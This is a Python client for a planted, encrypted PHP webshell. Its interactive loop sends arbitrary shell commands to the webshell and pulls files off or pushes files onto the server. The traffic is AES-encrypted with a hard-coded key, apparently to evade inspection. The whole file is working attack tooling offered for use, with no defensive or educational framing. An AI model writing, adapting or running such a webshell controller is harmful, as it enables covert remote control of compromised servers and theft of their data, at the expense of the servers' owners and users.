import json
import shutil
import requests

from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad, unpad
from base64 import b64encode, b64decode

SERVER_ADDR = ("127.0.0.1", 80)
SERVER_URL = "http://{}/webshells/webshell-secure.php".format(':'.join(str(p) for p in SERVER_ADDR))

GET_FILE = "!get"
PUT_FILE = "!put"

CMD_TYPE = "cmd"
GET_TYPE = "getfile"
PUT_TYPE = "putfile"

PAYLOAD_KEY = "p"
CTRL_KEY = "id"
EXIT_SHELL = "exit"

ENC_KEY = "c7b35827805788e77e41c50df4444149"

class AESCipher:
    """ Implements all needed cipher methods """
    def __init__(self, key):
        self.key = key.encode('utf-8')[:32]

    def encrypt(self, data):
        iv = get_random_bytes(AES.block_size)
        self.cipher = AES.new(self.key, AES.MODE_CBC, iv)
        if type(data) == str:
            data = data.encode('utf-8')
        return iv + self.cipher.encrypt(pad(data, AES.block_size))

    def decrypt(self, data):
        self.cipher = AES.new(self.key, AES.MODE_CBC, data[:AES.block_size])
        dec = self.cipher.decrypt(data[AES.block_size:])
        return unpad(dec, AES.block_size)

cipher = AESCipher(ENC_KEY)


def encrypt_post_data(post_data):
    """ 
    Function encrypts a given dictionary, and returns it in a post body wrapping
    For easy use with http requests
    """
    return {PAYLOAD_KEY: cipher.encrypt(json.dumps(post_data))}
    

def run_cmd(cmd):
    """
    Function handles running system commands, 
    @returns decrypted json object describing status
    """
    data = encrypt_post_data({"type": CMD_TYPE, CTRL_KEY: cmd})
    raw_result = requests.post(SERVER_URL, data=data).content
    dec_result = cipher.decrypt(raw_result)
    return json.loads(dec_result)


def get_file(cmd):
    """
    Downloads file from remote path on server to local
    Handles large encrypted file downloads, (without a tmp file)
    !get <remote_path> <local_path>

    @returns string describing status
    """
    remote_path, local_path = cmd.strip().split(' ')[1:3]
    data = encrypt_post_data({"type": GET_TYPE, CTRL_KEY: remote_path})
    
    # getting the encrypted file as a stream from the server
    with requests.post(SERVER_URL, stream=True, data=data) as r:
        if r.status_code == 404:
            return "File not found"

        # reading chunks from the http stream, decrypting them and appending to a destination file 
        with open(local_path, 'wb') as f:
            # every chunk contains (iv + encrypted chunk data of file)
            chunksize = 1024*8 + 32
            while True:
                buf = r.raw.read(chunksize)
                if not buf:
                    break
                f.write(cipher.decrypt(buf))

    return "Done"


def put_file(cmd):
    """
    Uploads file from local path to remote path on server
    !put <local_path> <remote_path>

    @return json describing status from server
    """
    local_path, remote_path = cmd.strip().split(' ')[1:3]
    
    def read_encrypt(file_obj, chunksize):
        while True:
            data = file_obj.read(chunksize)
            if not data:
                break
            yield cipher.encrypt(data)
    
    with open(local_path, 'rb') as f:
        # passing a generator for the body, for sending the encrypted file chunks
        # other metadata is passed on the URI
        params = encrypt_post_data({"type": PUT_TYPE, CTRL_KEY: remote_path})
        res = requests.put(SERVER_URL, params=params, data=read_encrypt(f, chunksize=1024))
    
    dec = cipher.decrypt(res.content)
    return json.loads(dec)


def display_result(result):
    """ 
    Handles printing of json and normal results
    """
    # getfile does not return a json response
    if type(result) == str:
        print(result)
    elif "stderr" in result:
        print("Got Error:\n{}".format(result["stderr"]))
    elif "stdout" in result:
        print(result["stdout"])


def main():
    print("Special methods:")
    print("!get <remote_path> <local_path>")
    print("!put <local_path> <remote_path>")
    
    while True:
        cmd = input("$ ")
        if not cmd:
            continue
        elif cmd == EXIT_SHELL:
            break

        try:
            if GET_FILE in cmd:
                result = get_file(cmd)
            elif PUT_FILE in cmd:
                result = put_file(cmd)
            else:
                result = run_cmd(cmd)
            display_result(result)	

        except Exception as x:
            print("Home error: {}".format(x))

if __name__ == '__main__':
    main()
    